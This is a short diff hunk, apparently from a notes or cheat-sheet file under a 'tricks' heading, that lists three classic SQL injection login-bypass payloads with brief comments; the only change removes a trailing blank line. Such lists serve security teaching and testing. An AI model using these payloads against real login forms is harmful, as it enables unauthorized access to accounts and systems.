@@ -53,4 +53,3 @@ tricks:
       admin' --             # Double dash comment
       admin' OR '1'='1      # String comparison
       ' OR 1=1 #            # Don't need to know username
-
